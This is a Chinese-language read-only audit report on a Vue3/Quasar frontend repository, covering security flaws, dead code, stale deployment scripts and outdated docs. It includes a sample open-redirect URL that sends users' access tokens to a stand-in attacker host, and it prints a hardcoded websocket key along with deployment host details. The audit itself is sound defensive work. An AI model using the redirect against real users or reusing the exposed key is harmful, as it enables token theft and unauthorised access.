# C2 轨审计报告 — mynet_gui 仓自身（2026-10-13，只读审计，未改任何仓库文件）

范围：mynet_gui/** 全仓（Vue3 + Quasar 用户前端）。api 字段/路径契约归 B1 复核，知识库文档归 B2。
实测取证：`vue-tsc --noEmit`（194 错）、`vitest run`（4 文件/41 测试通过）、`eslint`（0 报）、
`node dev-tools/check-i18n.js`（通过，zh 2194 / en 2029 / 用到 1006 键）、dist/spa 产物反查、
全 src 双通道引用扫描（文件名 + 导出名，过路由表/动态 import/菜单配置/字符串引用/tests/docs）。

## 发现清单

### S1 安全红线

[错漏|S1] middleware.ts 的 OAuth callback 开放重定向把 access token 拼进任意外域 URL — 证据 src/router/middleware.ts:22-27（`const callback = to.query.callback` → `window.location.href = callback + sep + 'token=' + encodeURIComponent(token)`，无任何域名校验）— 影响：攻击者构造 `/auth/login?callback=https://evil.example/` 即可把已登录用户的 Bearer token 送进任意站点（token 外泄 + 开放重定向）— 处置建议：callback 白名单校验（同源/注册回调域），或改为一次性 code 而非 token 走 URL。 GUARD-OK 误报：对账记录引用的攻击示例代码片段，非凭据

### S2 违反设计

[违反设计|S2] 调试/占位页挂在生产 UI：ApiTestPage 是 "Coming Soon" 空占位却进生产菜单 — 证据 src/layouts/MainLayout.vue:593-600（`navigation.apiTest` → `/app/api-test`）+ src/pages/system/ApiTestPage.vue:1-27（只有一张 comingSoon 卡）+ src/router/routes.ts:285；另 TokenDebugPage 生产路由仍注册（routes.ts:300-305，菜单项仅 dev 显示 MainLayout.vue:606-614）、FormStyleGuidePage 示例页可从生产路由访问（routes.ts:293-299）— 影响：与「配置流程硬台阶+折叠引导」用户裁定的界面收敛相悖，用户面暴露无功能死页与调试面 — 处置建议：生产路由/菜单剔除或加 dev 门；FormStyleGuide 移出生产路由表。

[历史包袱|S2] 部署脚本族两套目标并存，rollback/pre-deploy-check 仍指向旧 dsplat 部署 — 证据 rollback.sh:10-11（`REMOTE_HOST="112.124.22.220"`、`REMOTE_PATH="/alidata/www/dsplat.com/mynet.dsplat.com/front"`）、rollback.sh:106（回滚后提示 `https://mynet.dsplat.com`）、pre-deploy-check.sh:111-122（同旧 IP/旧路径）对照 deployment.sh:14-15 / quick-deploy.sh:10-11（`my.mynet.club:/data/app/mynet.club/my/public`）— 影响：真出事跑 rollback 会 `rm -rf` 并恢复到**旧域名旧目录**（rollback.sh:91-93），现行站点不受影响也不回滚；pre-deploy-check 校验的也不是将要部署的主机 — 处置建议：收敛为单一部署目标来源，rollback/check 脚本与 deployment.sh 同源。

[违反设计|S2] 三层路由守卫并存互相打架 + 用户面假门椒残留 — 证据 src/boot/auth.ts:131-170、src/router/middleware.ts:15-83、src/router/nodeRoutes.ts:165-195 三个独立 `router.beforeEach`（认证语义各写一份）；`document.title` 双写两种格式（nodeRoutes.ts:189-194 `- MyNet` vs middleware.ts:65-70 `| MyNet`，最终值取决于注册顺序）；`hasNodeEditPermission` 是 TODO 恒 true 的假门椒（middleware.ts:56,105-111）— 影响：与裁定 B3「用户面不长门椒（857dfa1 已删 hasPermission/hasRole）」相悖，本处漏删；守卫分叉是 `/login` 一类跳转事故的温床 — 处置建议：收敛为单一守卫（boot/auth 一处），删假门椒与重复 afterEach。

### S3 错漏

[错漏|S3] MainLayout 登出后跳转不存在的 `/login` 路由 — 证据 src/layouts/MainLayout.vue:716,719（`router.push('/login')`）；路由表无 `/login`（routes.ts:4-328 旧路径重定向列表也不含）— 影响：正常登出靠 boot/auth.ts:162-164 守卫兜回 `/auth/login`（碰巧正确）；**登出失败路径**（catch 分支，仍带登录态）直接落 404 页（catchAll）— 处置建议：改 `/auth/login`。

[错漏|S3] 推荐功能删了壳没删，残留 3 条 TS2307 断链并被棘轮固化 — 证据 src/composables/useRecommendations.ts:6-7 与 src/components/dashboard/RecommendationsCard.vue:95 引用 `../services/recommendations/{UserStateAnalyzer,RecommendationEngine}`，目录 `src/services/recommendations/` 不存在；vue-tsc 实测 3 条 `TS2307`（在 194 基线内躺平，见 /tmp/audit-2026-10-13/gui-tsc.log）— 影响：基线被「死代码的编译错」占额，掩盖真错误；唯一调用者 RecommendationsCard 本身零引用（见死组件清单）— 处置建议：连同 RecommendationsCard、types/recommendation-api.ts 一并删除，基线随 `check:types --update` 下调。

[错漏|S3] 死模块内另有断链/类型漂移 3 处（均在 194 基线内）— 证据 src/services/apiVersionService.ts:7 `from '../api'` 模块不存在（应为 `./api`，TS2307）；src/composables/useConfigBundle.ts:15 引入 types/nodeConfig 不存在的导出 `VersionCompatibilityResult`（TS2305）；src/pages/system/TokenDebugPage.vue:122 引入 services/websocket 不存在的导出 `TimeUpdateMessage`（TS2305）— 影响：死代码断链靠摇树免炸（见疑点 1），一旦被引用即构建失败/运行时错 — 处置建议：死码删除优先，非死码修引用。

[错漏|S3] apiService.getDashboardData 永远返回 mock 假数据 — 证据 src/services/api.ts:468-471（`async getDashboardData() { return mockApiResponse(mockDashboardData) }`，注释「Dashboard 暂时使用模拟数据」）+ src/services/mockData.ts:175（mockDashboardData）— 影响：实测零调用（useDashboard 不走它，DashboardPage 经 useDashboard/useRoutes 取真数据）＝死假数据栈；若后人接上即向用户展示假仪表盘 — 处置建议：删 getDashboardData + mockData.ts + api.ts:165 mockApiResponse + 未用 import mockDelay（api.ts:5）。

[冗余垃圾|S3] CPI-70 现状核实**未修**：`GET /nodes/{id}/status` 每个未配置节点打一次，响应只写不读 — 证据 src/pages/node/NodeListPage.vue:126-152（`nodeStatusInfo.value[nodeId] = response.data` 仅在 :135 当去重标记用，模板与他处零读取）+ src/services/node/nodeService.ts:287-289 — 影响：无谓请求 + 状态从未呈现，正是「默认值掩盖/请求白打」类 — 处置建议：要么读出来渲染，要么删请求（产品裁定）。

### S4 冗余/垃圾

[冗余垃圾|S4] 12 个零引用组件共 3361 行（流程简化 3a1b53d 后的孤儿） — 证据（全 src 含 tests/docs/动态 import 字符串 grep 零命中）：src/components/service/ServiceCardContent.vue(575)、route/NodeRoutesDisplay.vue(368)、node/QuickCreateDialog.vue(300)、auth/AccountActivationDialog.vue(296)、route/NodeSelector.vue(273)、common/CardLayoutExample.vue(233)、dashboard/RecommendationsCard.vue(435)、auth/PasswordResetDialog.vue(482)、dashboard/RealtimeMetrics.vue(96)、social/SocialCard.vue(129)、common/LanguageSwitcher.vue(85)、auth/ResetPasswordForm.vue(89) — 处置建议：整批删除（参照 7717e65/f2ee1bb 的「页面与死文案一起删」先例）。

[冗余垃圾|S4] 「配置包 v2.2.0」旧实现整簇死亡（被 bundleEnvelopeService 取代） — 证据 src/composables/useConfigBundle.ts(186 行，唯一引用是 composables/index.ts:15 barrel) → src/services/apiVersionService.ts（唯一消费者是 useConfigBundle）→ src/services/node/configBundleService.ts（消费者仅 useConfigBundle + 死 barrel）；对照现行 src/services/node/bundleEnvelopeService.ts（useNodeKeys/useNodeConfig/NodeConfigPage 在用）— 处置建议：三件套 + 相关 types 一并删。

[冗余垃圾|S4] 缓存三件套死一半：useCache.ts(198 行) 三个导出零调用 — 证据 src/composables/useCache.ts:8,76,150（useCacheStatus/useApiCache/useDataPrefetch），全仓仅 composables/index.ts:23 转出，无消费者；活链是 zoneServiceApi → utils/apiCache.ts → utils/cacheManager.ts（zoneServiceApi.ts:2 在用）— 处置建议：删 useCache.ts 及 barrel 转出行。

[垃圾|S4] 空文件/调试数据残留 — 证据 src/utils/tokenRefreshService.ts（0 字节空文件）；src/services/testData.ts（74 行「测试IP池数据」，零引用）；src/utils/tokenRefreshTest.ts（token 刷新自测脚手架，仅 TokenDebugPage 用，随路由进生产包）— 处置建议：删前两个；tokenRefreshTest 随 TokenDebugPage 去留裁定。

[垃圾|S4] router/middleware.ts 后半 ~230 行零调用 — 证据 src/router/middleware.ts:113-341（RouteWatcher/BreadcrumbGenerator/PageProgressBar/RouteStateCache/createRouteUtils），`routeUtils` 仅 router/index.ts:21 导出后无人 import（全仓 grep 零）— 处置建议：删。

[历史包袱|S4] Quasar 生成物入仓两份，且曾手改生成文件 — 证据 git ls-files 含 `.quasar/**`(13 文件) 与 `front/.quasar/**`(13 文件)，front/ 目录下**只有** .quasar（无源码，最后被无关提交 9a7a1b6 带入）；a3fb888「prod-spa/client-entry.js 的 publicPath 跟上 /gui/」是手改生成物，而现行 quasar.config.ts:140 已有 `publicPath: process.env.VITE_ROUTER_BASE || '/'`，补丁已过时；另 tsconfig.json:3 `extends ./.quasar/tsconfig.json` 依赖可被 `postinstall quasar prepare` 重写的生成物 — 处置建议：两份 .quasar 出库进 .gitignore，publicPath 走配置（已具备）。

[垃圾|S4] 三个测试 HTML 随构建发进生产 — 证据 public/test-boot.html、public/time-test.html、public/network-config-test.html；dist/spa 实测三者均在产物根（构建 2026-10-12 16:03）— 处置建议：移出 public/。

[冗余垃圾|S4] 格式化函数多份重复实现 — 证据 formatBytes ×6：src/utils/dateFormat.ts:141、src/utils/nodeSummaryDisplay.ts:187、src/composables/useNode.ts:38、src/components/route/RouteDetailsDialog.vue:235、src/components/route/TrafficStatsCard.vue:125、src/components/route/ConnectionHistoryCard.vue:455；另 formatDateTime/formatDate/formatTime/formatSpeed 在 dateFormat.ts 与多个组件内各写一份（NotificationDialog.vue:304、RecentActivities.vue:105、NodeRoutesDisplay.vue:329 等），且 package.json 有 date-fns 又有 quasar `date.formatDate`（MainLayout.vue:725）— 处置建议：收敛到 utils/dateFormat.ts 一份。

[冗余垃圾|S4] 四个死 barrel：src/services/{node,route,social,zone}/index.ts 零导入（各文件 `export * from` 转出；notification/index.ts 有真实消费者不在此列）— 处置建议：删或统一走单入口。

[冗余垃圾|S4] i18n 死键规模超一千 — 证据 check-i18n 实测：zh 2194 键 / en 2029 键 / 全仓仅用 1006 键；工具只查「用到的键缺不缺」，查不出死键；中英差 165 键亦无人拦 — 处置建议：死键清理脚本 + 中英对齐检查进 lint。

[垃圾|S4] console 直用 84 处/11 文件（生产靠 terser drop_console 兜底） — 证据 grep `console.` 84 hits：src/App.vue、stores/onboarding.ts、utils/{dateFormat,debug,tipsStorage}.ts、components/node/NodeCardContent.vue、service/ServiceCardContent.vue、pages/route/ConnectionDetailsPage.vue、pages/services/{Public,Friend,My}ServicesPage.vue 等；仓内已有 debug 封装规范（.github/copilot-instructions.md「Use debug, NOT console」）与 CONSOLE_LOG_REMOVAL_REPORT.md（docs/_archive/reports/）— 处置建议：换 debug 封装，历史报告别再写第二份。

[冗余垃圾|S4] 未用 import 两处 — 证据 src/services/api.ts:5 `mockDelay`（仅 import 未用）；src/composables/useDashboard.ts:5 `apiService`（import 后无调用）— 处置建议：随死码清理顺手删。

### S5 包袱/过期文档

[过期文档|S5] 两份 openapi 指向虚构/错误域名且主次不明 — 证据 docs/openapi.yaml:26-36 与 docs/openapi-v1-complete.yaml:26-36：`https://api.mynet.com/api/v1`、`staging.mynet.com`、`github.com/mynet-project`，与现行「my.mynet.club 同源 /api/v1」（.env.prod、api.ts:13-17）不符；6074 行 vs 1591 行两份并存无权威声明 — 影响：契约文档误导（内容归 B1 复核）— 处置建议：改 servers 为同源相对、标注权威版本，另一份归档。

[过期文档|S5] docs/01-06 主文档群停在 Vue CLI/localhost:8000 时代 — 证据 docs/03-开发指南.md:32-33（`VUE_APP_API_URL`，Vue CLI 前缀，现行是 VITE_*）、docs/05-API文档.md:10-11,792（`localhost:8000/api/v1`、`ws://localhost:8000/ws`，现行 WS 走 my.mynet.club `/wss`）、docs/UPGRADE-v2.md:90（`api.mynet.local/api/v2`——V2 未上线见 CPI-41，api.ts 用 /api/v1）、docs/REAL_BACKEND_VERIFICATION.md、docs/TOKEN_REFRESH.md:174 同类 — 处置建议：按现状重写或归档进 docs/_archive。

[过期文档|S5] docs/quick-create-node-frontend.md 指向已零引用的 QuickCreateDialog.vue — 证据文档全文以该组件为对象，组件现已零引用（见死组件清单，NodeCreatePage 3a1b53d 重写后取代）— 处置建议：随组件删除一并归档。

[历史包袱|S5] 根 nginx.conf 整份是旧 dsplat 模板，与 deploy/production-nginx.conf 分叉 — 证据 nginx.conf:13-48,129-130（server_name mynet.dsplat.com、证书 /etc/letsencrypt/live/dsplat.com、root /alidata/www/dsplat.com/...）+ :105-117 WS 只认 `/app/`、`/ws/` 旧路径（现行客户端默认 `/wss`，src/services/websocket.ts:82-89）+ :88-89 `proxy_pass https://127.0.0.1:443/` 丢 `/api/` 前缀（对照 deploy/production-nginx.conf:83 保前缀、:102 `/wss/`）— 处置建议：删根 nginx.conf 或明确标注废弃，只留 deploy/production-nginx.conf + nginx-config-example.conf 一份模板。

[过期文档|S5] dev-tools/check-types.js 注释与基线漂移 — 证据 dev-tools/check-types.js:9（「211 条存量，33 个文件」）vs dev-tools/typecheck-baseline.json `total: 194` / 38 文件（本轮 vue-tsc 实测 194 一致）— 处置建议：注释改为不复述数字（Makefile 自己也写了「别复述数字」）。

[违反设计|S5] README 口径与用户裁定有出入 — 证据 README.md:23（「多区域隔离: Zone-based数据隔离和权限管理」）：「区域/Zone」与「网络区/Network」口径不一，「权限管理」表述与裁定 B3（用户面不表达 tenant 权限）相悖 — 处置建议：按 terms.ts 口径改写。

## 已知账命中

- **CPI-7（Reverb 开发/生产同密钥入仓）**：现状依旧——.env:16-17、.env.dev:27-28、.env.prod:29-31 同值。**新增证据**：src/services/websocket.ts:96 把 `oyzmmhlqzmar2uvanq2k` 硬编码为 fallback（源码里再藏一份）。
- **CPI-30/30a（Quasar env 命名法）**：已修属实——仓内只有 .env/.env.dev/.env.prod/.env.embed/.env.example（无 .env.development/.env.production 死文件）；.env.local.dev 未跟踪且 .gitignore 已补 `.env.local.*` 覆盖。
- **CPI-34（onboarding 后端 500 → localStorage 兜底）**：现状依旧——src/stores/onboarding.ts:470-477 fetchFromBackend catch 吞错返回 null 回落本地。
- **CPI-70（/nodes/{id}/status 响应未读）**：现状依旧，见 S3 第 5 条（NodeListPage.vue:126-152）。
- **CPI-77（desktop CI 缺 GUI embed 输入）**：GUI 侧佐证——本仓 Makefile 只有 lint/test/guard，无 `dist` 目标，agent Makefile 要求的兄弟 `GUI dist/spa` 在本仓没有对应构建契约入口（构建入口是 `npm run build`）；发行链归属归 B1/发行链复核。
- **类型棘轮基线 194/38**：实测 vue-tsc 194 条、38 文件（含 quasar.config.ts 1 条），与 typecheck-baseline.json 持平；**vitest 4 文件/41 测试全过**，与已知基线一致。
- **CPI-25、/route/requests 无人调用（GUI 走 /route/data）** 等 api 侧条目：按分工归 B1，本轮未重复详述。

## 疑点待验证

1. **死代码断链为何没炸生产构建**：apiVersionService.ts:7 的 `'../api'` 断链 + useRecommendations 断链在依赖图里（composables barrel → useConfigBundle → apiVersionService），但 dist/spa（2026-10-12 构建）成功且死代码未烘入（assets 中 grep `mockDashboardData|testIPPoolsData|supportsConfigBundle` 零命中）——推断摇树先于模块解析剔除；受只读限制未跑完整 `quasar build` 复证。
2. **.env.embed 的 `VITE_API_BASE_URL=/gui`**（.env.embed:6）经 api.ts:13-17 拼成 `/gui/api/v1`，与 mynetd localapi 的实际挂载前缀是否一致需归 B1 对 agent 契约复核。
3. **ApiTestPage 进生产菜单是否有意保留的诊断入口**：未查到用户裁定记录；若有裁定则 S2 第 1 条降级为「占位页需补功能或补文案」。
4. **WebUI 配置流程闸门（登录→选节点→密钥→加载配置→启动）实体在 mynet_agent 的 localapi WebUI，不在本仓**；本仓对应物是 onboarding（stores/onboarding.ts + useOnboardingActions + TipsRegistry）。本轮查得的 12 个孤儿组件多为 3a1b53d「简化设备与连接流程」后遗留，但未逐一 git 二分考证各自死于哪次流程改动。
5. **i18n 165 个中英键差**（zh 2194 vs en 2029）未逐键定性是死键还是漏译（check-i18n 判「用到的键」均在两语齐全，故倾向全是死键，未逐键核）。

## 覆盖说明

- **引用面复核（判零引用的口径）**：路由表 src/router/{routes,nodeRoutes}.ts 全量、MainLayout 菜单配置（MainLayout.vue:482-615）、动态 `import()` 字符串、composables/services/types 三个 barrel、i18n 键、docs/*.md、vitest 套件、dev-tools 脚本，均以「文件名含扩展名（.vue）+ 导出名裸词（.ts）」双通道 grep 复核；空结果前先以正向用例验证过 grep 可用。
- **实测命令**：vue-tsc（194 错逐文件归因已存 /tmp/audit-2026-10-13/gui-tsc.log）、vitest run（41/41）、eslint（0 报）、check-i18n.js、dist/spa 产物反查、git ls-files/log、stat 构建时间。
- **未覆盖**：浏览器实机流程、`quasar build` 全量复跑（避免写仓内 dist）、openapi 与 api 路由逐条契约（归 B1）、知识库文档（归 B2）、`.github/copilot-instructions-详细版.md` 未逐段核。
- 本轮未修改任何仓库文件；所有结论均静态 + 只读实测，未做生产验收。
